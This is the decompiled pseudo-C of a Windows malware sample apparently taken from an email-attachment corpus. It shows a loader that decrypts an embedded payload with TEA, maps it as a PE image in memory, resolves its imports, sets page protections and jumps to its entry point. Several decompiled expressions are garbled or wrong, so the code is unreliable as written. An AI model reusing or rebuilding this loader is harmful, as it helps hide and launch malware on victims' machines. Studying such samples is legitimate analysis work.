/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0511/ia32_pe/subject.exe'
 */

/*	Procedure: 0x003E1000 - 0x003E101B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1000(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    (save)ecx;
    *(ebp - 8) = A8;
    eax = *(ebp - 8);
    *(ebp - 4) = *(ebp - 8) + *(eax + 60);
    return(*(ebp - 4));
}

/*	Procedure: 0x003E101C - 0x003E1044
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E101C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    L003E1944(Ac, A8, A10);
    return(*__imp__VirtualProtect(Ac, A10, 2, ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1045 - 0x003E1080
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1045()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003E881C) {
        *(ebp + 8) = *L003E8818;
    }
    eax = *L003e8810( *(ebp + 8), *(ebp + 12), *(ebp + 16));
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1081 - 0x003E10B2
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1081()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003E881C) {
        *(ebp + 8) = *L003E8818;
    }
    return(*L003e8814( *(ebp + 8), *(ebp + 12), *(ebp + 16)));
}

/*	Procedure: 0x003E10B3 - 0x003E1124
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E10B3(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)A10;
    (save)A8;
    *(ebp - 4) = *__imp__GetProcAddress();
    if(L003E1A34(Ac, 4071472) == 0) {
        if(L003E19B0(A10, 4071488) == 0) {
            *L003E8810 = *(ebp - 4);
            eax = 0x3e1050;
        } else {
            if(L003E19B0(A10, 4071508) != 0) {
                goto L003e111f;
            }
            *L003E8814 = *(ebp - 4);
            eax = 0x3e1081;
        }
    } else {
L003e111f:
        eax = *(ebp - 4);
    }
}

/*	Procedure: 0x003E1125 - 0x003E1137
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1125(A8)
/* unknown */ void  A8;
{



    eax = ~(A8 & -2147483648);
    asm("sbb eax,eax");
    return(~eax);
}

stack space not deallocated on return
/*	Procedure: 0x003E1138 - 0x003E125E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1138()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 36;
    *L003E8818 = *__imp__GetModuleHandleA(0);
    *L003E881C = *(ebp + 12);
    *(ebp - 8) = *(ebp + 8) + 128;
    eax = *(ebp - 8);
    for(*(ebp - 4) = *(ebp + 12) + *eax; 1; *(ebp - 4) = *(ebp - 4) + 20) {
        eax = *(ebp - 4);
        if(*(eax + 12) == 0) {
            break;
        }
        *(ebp - 12) = 0;
        *(ebp - 16) = 0;
        (save) *(ebp + 12);
        *(ebp - 28) = ecx + *( *(ebp - 4) + 12);
        *(ebp - 24) = *__imp__LoadLibraryA( *(ebp - 28));
        if(*( *(ebp - 4) + 4) != 0) {
            (save) *(ebp + 12);
            *(ebp - 12) = ecx + *( *(ebp - 4));
        } else {
            eax = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *(eax + 16);
        }
        eax = *(ebp - 4);
        for(*(ebp - 20) = *(ebp + 12) + *(eax + 16); *( *(ebp - 12)) != 0; *(ebp - 12) = *(ebp - 12) + 4) {
            (save) *(ebp - 24);
            L003E1125( *( *(ebp - 12)));
            if((al & 255) == 0) {
                eax = *(ebp - 12);
                *(ebp - 36) = *(ebp + 12) + *eax;
                *(ebp - 16) = L003E10B3( *(ebp - 24), *(ebp - 28), *(ebp - 36) + 1 + 1);
            } else {
                *(ebp - 32) = *( *(ebp - 12)) & 65535;
                (save) *(ebp - 32) & 65535;
                (save) *(ebp - 24);
                *(ebp - 16) = *__imp__GetProcAddress();
            }
            eax = *(ebp - 20);
            *eax = *(ebp - 16);
            *(ebp - 20) = *(ebp - 20) + 4;
        }
    }
    esp = ebp;
}

/*	Procedure: 0x003E125F - 0x003E125F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E125F()
{



    asm("int3");
}

/*	Procedure: 0x003E1260 - 0x003E1296
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1260(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__ReadFile(A8, Ac, A10 - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e1286;
        }
        eax = *(ebp - 4);
    } while(eax != A10);
    goto L003e1293;
L003e1286:
    al = 0;
    goto L003e1295;
L003e1293:
    al = 1;
L003e1295:
}

/*	Procedure: 0x003E1297 - 0x003E12CD
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1297(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__WriteFile(A8, Ac, A10 - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e12bd;
        }
        eax = *(ebp - 4);
    } while(eax != A10);
    goto L003e12ca;
L003e12bd:
    al = 0;
    goto L003e12cc;
L003e12ca:
    al = 1;
L003e12cc:
}

stack space not deallocated on return
/*	Procedure: 0x003E12CE - 0x003E1321
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E12CE()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp - 4) = *(ebp - 4) + 1 + 1) {
        eax = *(ebp - 4);
        if(eax >= *(ebp + 16)) {
            break;
        }
        eax = *(ebp - 4);
        L003E1297( *( *(ebp + 8) + 4), *(ebp + 12) + eax * 4, 8);
        eax = *(ebp - 4);
        L003E1260( *( *(ebp + 8)), *(ebp + 12) + eax * 4, 8);
    }
    esp = ebp;
}

/*	Procedure: 0x003E1322 - 0x003E1414
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1322(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    for(Vfffffff4 = A8; 1; L003E1297( *(Vfffffff4 + 4), & Vfffffff8, 8)) {
        L003E1260( *Vfffffff4, & Vfffffff8, 8);
        if((al & 255) == 0) {
            break;
        }
        Vffffffec = 20;
        Vffffffec = Vffffffec + 12;
        Vfffffff0 = Vfffffff8;
        Vffffffe8 = Vfffffffc;
        Vffffffe0 = -1640531527;
        for(Vffffffe4 = Vffffffe0 << 5; 1; Vffffffe4 = Vffffffe4 - Vffffffe0) {
            Vffffffec = Vffffffec - 1;
            if(Vffffffec <= 0) {
                break;
            }
            Vffffffe8 = Vffffffe8 - ((Vfffffff0 << 4) + *L0040FF16 ^ Vfffffff0 + Vffffffe4 ^ (Vfffffff0 >> 5) + *L0040FF1A);
            Vfffffff0 = Vfffffff0 - ((Vffffffe8 << 4) + *L0040FF0E ^ Vffffffe8 + Vffffffe4 ^ (Vffffffe8 >> 5) + *L0040FF12);
        }
        Vfffffff8 = Vfffffff0;
        Vfffffffc = Vffffffe8;
    }
    return(0);
}

/*	Procedure: 0x003E1415 - 0x003E1431
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1415(A8)
/* unknown */ void  A8;
{



    (save) *A8;
    *__imp__CloseHandle();
    return(*__imp__CloseHandle( *(A8 + 4)));
}

/*	Procedure: 0x003E1432 - 0x003E15B5
 *	Argument size: -48
 *	Local size: 48
 *	Save regs size: 0
 */

L003E1432()
{
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = L003E15D0();
    Vffffffe8 = *(Vfffffffc + 48);
    if(( *(Vffffffe8 + 2) & 255) != 0) {
        eax = 0;
    } else {
        *L0040FF0E = 5900;
        *L0040FF0E = *L0040FF0E + 22702;
        *L0040FF12 = 9413;
        *L0040FF16 = 6132;
        *L0040FF16 = *L0040FF16 + 22574;
        *L0040FF1A = 19392;
        (save)16;
        (save)0;
        (save) & Vfffffff0;
        (save) & Vffffffe0;
        if(*__imp__CreatePipe() == 0) {
            eax = 0;
        } else {
            (save)16;
            (save)0;
            (save) & Vffffffe4;
            (save) & Vffffffec;
            if(*__imp__CreatePipe() == 0) {
                eax = 0;
            } else {
                (save) & Vfffffff8;
                (save)0;
                (save) & Vffffffe0;
                (save)0x3e1322;
                (save)0;
                (save)0;
                Vffffffdc = *__imp__CreateThread();
                L003E12CE( & Vffffffec, 0x3e3000, *L003E8803 >> 2);
                L003E1415( & Vffffffec);
                L003E1415( & Vffffffe0);
                (save)Vffffffdc;
                *__imp__CloseHandle();
                Vfffffff4 = L003E1000(0x3e3000);
                if(Vfffffff4 != 0) {
                    Vffffffd4 = *(Vfffffff4 + 52);
                    L003E101C(0x3e3000, Vffffffd4, *(Vfffffff4 + 84));
                    L003E15E0(Vfffffff4, 0x3e3000, Vffffffd4);
                    Vffffffd8 = L003E1000(Vffffffd4);
                    if(Vffffffd8 != 0) {
                        L003E1138(Vffffffd8, Vffffffd4);
                        L003E1778(Vffffffd8, Vffffffd4);
                        *(Vffffffe8 + 8) = Vffffffd4;
                        Vffffffd0 = Vffffffd4 + *(Vfffffff4 + 40);
                        Vffffffd0();
                    }
                }
                eax = 0;
            }
        }
    }
}

stack space not deallocated on return
/*	Procedure: 0x003E15B6 - 0x003E15CC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

__entry_point__()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = L003E1432();
    return(*__imp__ExitProcess( *(ebp - 4)));
}

/*	Procedure: 0x003E15CD - 0x003E15CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15CD()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E15D0 - 0x003E15DA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15D0()
{



    return(*%fs:0x18]);
}

/*	Procedure: 0x003E15DB - 0x003E15DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15DB()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x003E15E0 - 0x003E16AD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E15E0()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 40;
    *(ebp - 12) = *(ebp + 8) + 248;
    *(ebp - 8) = *( *(ebp + 8) + 6);
    *(ebp - 4) = *(ebp - 12);
    for(*(ebp - 16) = 0; 1; *(ebp - 16) = *(ebp - 16) + 1) {
        eax = *(ebp - 16) & 65535;
        if(eax >= ( *(ebp - 8) & 65535)) {
            break;
        }
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 36) = *(eax + *(ebp - 4) + 8);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 20) = *(eax + *(ebp - 4) + 16);
        *(ebp - 40) = *(ebp - 36) >= *(ebp - 20) ? *(ebp - 20) : *(ebp - 36);
        *(ebp - 24) = *(ebp - 40);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 28) = *(ebp + 16) + *(eax + ecx + 12);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 32) = *(ebp + 12) + *(eax + ecx + 20);
        L003E1944( *(ebp - 28), *(ebp - 32), *(ebp - 24));
    }
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E16AE - 0x003E1777
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E16AE()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = 0;
    if(!(eax = *(ebp + 8) & 67108864)) {
        *(ebp - 4) = *(ebp - 4) | 512;
    }
    *(ebp - 4) = !(eax = *(ebp + 8) & 536870912) ? !(eax = *(ebp + 8) & 1073741824) ? !(eax = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 64 : *(ebp - 4) | 32 : !(eax = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 128 : *(ebp - 4) | 16 : !(eax = *(ebp + 8) & 1073741824) ? !(eax = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 4 : *(ebp - 4) | 2 : !(eax = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 8 : *(ebp - 4) | 1;
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1778 - 0x003E1807
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1778()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 28;
    *(ebp - 12) = *(ebp + 8) + 248;
    *(ebp - 8) = *( *(ebp + 8) + 6);
    *(ebp - 4) = *(ebp - 12);
    for(*(ebp - 16) = 0; 1; *(ebp - 16) = *(ebp - 16) + 1) {
        eax = *(ebp - 16) & 65535;
        if(eax >= ( *(ebp - 8) & 65535)) {
            break;
        }
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 24) = *(ebp + 12) + *(eax + ecx + 12);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 28) = *(eax + *(ebp - 4) + 8);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *__imp__VirtualProtect( *(ebp - 24), *(ebp - 28), L003E16AE( *(eax + *(ebp - 4) + 36)), ebp - 20);
    }
}

/*	Procedure: 0x003E1808 - 0x003E180F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1808()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1810 - 0x003E182C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1810(A8)
/* unknown */ void  A8;
{



    if(A8 >= 65) {
        if(A8 > 90) {
            goto L003e1828;
        }
        A8 = A8 + 32;
    } else {
L003e1828:
    }
}

/*	Procedure: 0x003E182D - 0x003E1849
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E182D()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 8) >= 97) {
        if(*(ebp + 8) > 122) {
            goto L003e1844;
        }
        eax = *(ebp + 8) - 32;
    } else {
L003e1844:
        eax = *(ebp + 8);
    }
}

/*	Procedure: 0x003E184A - 0x003E1854
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E184A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1855 - 0x003E1859
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1855()
{



}

/*	Procedure: 0x003E185A - 0x003E1866
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E185A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
    return(0);
}

/*	Procedure: 0x003E1867 - 0x003E186D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1867()
{



    return(0);
}

/*	Procedure: 0x003E186E - 0x003E1874
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E186E()
{



    return(0);
}

/*	Procedure: 0x003E1875 - 0x003E1879
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1875()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E187A - 0x003E1880
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E187A()
{
	/* unknown */ void  ebp;



    ebp = esp;
    return(0);
}

/*	Procedure: 0x003E1881 - 0x003E1885
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1881()
{



}

/*	Procedure: 0x003E1886 - 0x003E1894
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1886()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1895 - 0x003E18A4
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1895(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = A8;
    *(ebp - 3) = 0;
    return(*(ebp - 4));
}

/*	Procedure: 0x003E18A5 - 0x003E18A9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18A5()
{



}

/*	Procedure: 0x003E18AA - 0x003E18C2
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E18AA(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;



    return(L003E1B6B(A8, & Vffffffe0, 10));
}

stack space not deallocated on return
/*	Procedure: 0x003E18C3 - 0x003E18DB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E18C3()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 32;
    eax = L003E1A90( *(ebp + 8), ebp - 32, 10);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E18DC - 0x003E1943
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18DC()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); *(ebp + 16) != 0; *(ebp + 16) = *(ebp + 16) - 1) {
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        eax = *( *(ebp + 8));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp + 12) = *(ebp + 12) + 1;
        if(eax == 0) {
            break;
        }
    }
    if(*(ebp + 16) != 0) {
        while(!( *(ebp + 16) = *(ebp + 16) - 1)) {
            *( *(ebp + 8)) = 0;
            *(ebp + 8) = *(ebp + 8) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x003E1944 - 0x003E197F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1944(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = A8; 1; Ac = Ac + 1) {
        A10 = A10 - 1;
        if(A10 == 0) {
            break;
        }
        *A8 = *Ac;
        A8 = A8 + 1;
    }
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1980 - 0x003E19AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1980()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *(ebp + 12);
    }
    eax = *(ebp - 4);
    esp = ebp;
}

/*	Procedure: 0x003E19B0 - 0x003E1A0A
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E19B0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    for(*(ebp - 4) = 0; !( *(ebp - 4) = ( *A8 & 255) - ( *Ac & 255)) && *Ac != 0; Ac = Ac + 1) {
        A8 = A8 + 1;
    }
    if(*(ebp - 4) < 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp - 4) > 0) {
            *(ebp - 4) = 0;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    }
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1A0B - 0x003E1A33
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A0B()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = *(ebp + 8);
    while(1) {
        eax = *( *(ebp - 4));
        *(ebp - 4) = *(ebp - 4) + 1;
        if(eax == 0) {
            break;
        }
    }
    eax = *(ebp - 4) - *(ebp + 8) - 1;
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1A34 - 0x003E1A89
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A34()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 16;
    do {
        *(ebp - 12) = *( *(ebp + 8)) & 255;
        *(ebp - 4) = L003E1810( *(ebp - 12));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp - 16) = *( *(ebp + 12)) & 255;
        *(ebp - 8) = L003E1810( *(ebp - 16));
        *(ebp + 12) = *(ebp + 12) + 1;
    } while(*(ebp - 4) != 0 && *(ebp - 4) == *(ebp - 8));
    eax = *(ebp - 4) - *(ebp - 8);
    esp = ebp;
}

/*	Procedure: 0x003E1A8A - 0x003E1A8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A8A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1A90 - 0x003E1AAB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A90()
{
	/* unknown */ void  ebp;



    ebp = esp;
    L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1AAC - 0x003E1B6A
 *	Argument size: 0
 *	Local size: 16
 *	Save regs size: 0
 */

L003E1AAC(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff7;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = Ac;
    if(A14 != 0) {
        *Vfffffffc = 45;
        Vfffffffc = Vfffffffc + 1;
        A8 = ~A8;
    }
    Vfffffff0 = Vfffffffc;
    do {
        eax = A8;
        edx = 0;
        A10 = A10 / A10;
        Vfffffff8 = A10 % A10;
        edx = 0;
        A10 = A10 / A10;
        edx = A10 % A10;
        0;
        if(Vfffffff8 <= 9) {
            eax = Vfffffff8 + 48;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        } else {
            eax = Vfffffff8 + 87;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        }
    } while(A8 > 0);
    *Vfffffffc = 0;
    Vfffffffc = Vfffffffc - 1;
    do {
        Vfffffff7 = *Vfffffffc;
        *Vfffffffc = *Vfffffff0;
        *Vfffffff0 = Vfffffff7;
        Vfffffffc = Vfffffffc - 1;
        Vfffffff0 = Vfffffff0 + 1;
        eax = Vfffffff0;
    } while(eax < Vfffffffc);
}

/*	Procedure: 0x003E1B6B - 0x003E1BA7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1B6B()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 16) == 10) {
        if(*(ebp + 8) >= 0) {
            goto L003e1b8f;
        }
        L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 1);
    } else {
L003e1b8f:
        L003E1AAC( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    }
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1BA8 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1BA8()
{



}

/* address  size  */
/* 0x003e15b6       0 */ /* unknown */ void 	__entry_point__;
/* 0x003e2000       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x003e2004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x003e2008       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x003e200c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x003e2010       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x003e2014       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x003e2018       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x003e201c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x003e2020       0 */ /* unknown */ void 	__imp__CreatePipe;
/* 0x003e2024       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
